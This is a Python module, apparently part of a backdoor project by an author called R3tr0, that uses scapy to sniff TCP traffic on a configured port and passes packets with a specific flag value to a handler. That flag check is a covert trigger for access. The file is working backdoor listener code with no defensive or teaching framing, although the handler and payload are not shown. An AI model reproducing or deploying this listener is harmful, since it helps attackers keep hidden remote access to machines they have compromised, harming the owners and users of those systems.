"""
Author: R3tr0
Date: 24/11/2023
Purpose: Holds the main operation of checking if the backdoor is trying to be accessed by an outsider
"""
from scapy.all import *

import consts


class BackdoorGateControl:
	"""
	the main operation of the backdoor gate control to accept and process packets
	"""
	def __init__(self,  packet_handler, bd_port=consts.LISTENING_PORT, accepted_flags=consts.RECIEVING_FLAG_VALUE):
		"""
		:param: packet_handler is the packet handler for the backdoor, basically a class that holds the function handle_packet(SCAPY_PACKET)
		:param: bd_port is the listening port for the backdoor
		:param: accepted_flags is the flags the backdoor accepts
		"""
		self.bd_port = bd_port
		self.packet_handler = packet_handler
		self.accepted_flags = accepted_flags


	def check_packet(self, packet):
		"""
		check if packet is suppose to be handled, in case it dose it will call the handle function
		:param: packet is the packet recieved from the sniffing
		"""
		if not TCP in packet:
			return
		if int(packet[TCP].flags) == self.accepted_flags:
			self.packet_handler.handle_packet(packet)


	def wait_for_bd_access(self):
		"""
		waiting for packets on the given port
		"""
		print(f"waiting for connection on port {self.bd_port}")
		sniff(filter=f"port {self.bd_port}", prn=self.check_packet)